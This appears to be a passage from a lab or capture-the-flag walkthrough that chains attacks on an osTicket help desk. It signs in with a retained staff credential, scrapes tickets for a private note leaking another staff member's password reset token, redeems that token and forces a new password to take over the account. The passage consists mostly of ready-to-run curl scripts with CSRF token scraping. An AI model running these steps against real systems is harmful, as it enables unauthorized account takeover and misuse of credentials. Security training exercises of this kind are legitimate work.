## Read the recovery-reference note as maya.ranscombe (from K17.1)

Use maya's retained staff login (`~/.config/fieldlink/support-client.json`,
`retained_staff_login`) to sign in to the osTicket staff panel, open case
SUP-2841, and read the private note `K17.2 Reviewer Recovery Reference`. It leaks
talia.mornac's osTicket password reset token.

```
mj=/tmp/maya.jar
mc=$(curl -sS --cacert $CA -c $mj "$BASE/scp/login.php" | grep -oP 'name="__CSRFToken__"[^>]*value="\K[^"]+' | head -1)
curl -sS --cacert $CA -b $mj -c $mj -o /dev/null -X POST \
  --data-urlencode "__CSRFToken__=$mc" --data-urlencode "userid=maya.ranscombe" \
  --data-urlencode "passwd=<maya_scp_password>" --data-urlencode "submit=Log In" \
  "$BASE/scp/login.php"
for id in $(curl -sS --cacert $CA -b $mj "$BASE/scp/tickets.php" | grep -oiE "tickets\.php\?id=[0-9]+" | grep -oE "[0-9]+" | sort -un); do
  page=$(curl -sS --cacert $CA -b $mj "$BASE/scp/tickets.php?id=$id")
  echo "$page" | grep -q "K17.2 Reviewer Recovery Reference" && { SUPID=$id; TOKEN=$(echo "$page" | grep -oE "k17-talia-mornac-review-token-[0-9]+" | head -1); break; }
done
echo "SUP-2841 ticket id=$SUPID  reset token=$TOKEN"
```

## Use the leaked token to sign in as talia.mornac

osTicket accepts the leaked reset token at `/scp/pwreset.php`. Enter the username
to sign in; osTicket then forces a new password.

```
tj=/tmp/talia.jar
tc=$(curl -sS --cacert $CA -c $tj "$BASE/scp/pwreset.php?token=$TOKEN" | grep -oP 'name="__CSRFToken__"[^>]*value="\K[^"]+' | head -1)
curl -sS --cacert $CA -b $tj -c $tj -o /dev/null -X POST \
  --data-urlencode "__CSRFToken__=$tc" --data-urlencode "do=newpasswd" \
  --data-urlencode "token=$TOKEN" --data-urlencode "userid=talia.mornac" \
  --data-urlencode "submit=Login" "$BASE/scp/pwreset.php"
```

## Set a new password for talia (the forced reset)

osTicket serves the forced password change as a staff AJAX call. Read the session
CSRF token and talia's staff id from the dashboard, then set a new password.

```
IDX=$(curl -sS --cacert $CA -b $tj "$BASE/scp/index.php")
META=$(echo "$IDX" | grep -oP 'name="csrf_token"[^>]*content="\K[^"]+' | head -1)
TID=$(echo "$IDX" | grep -oiE "staff/[0-9]+/change-password" | grep -oE "[0-9]+" | head -1)
NEW='Rev1ewer-Recovery-2841!'
curl -sS --cacert $CA -b $tj -c $tj -X POST -H "X-CSRFToken: $META" \
  --data-urlencode "passwd1=$NEW" --data-urlencode "passwd2=$NEW" --data-urlencode "current=" \
  "$BASE/scp/ajax.php/staff/$TID/change-password"
```

Output: `{"redirect":"index.php"}`
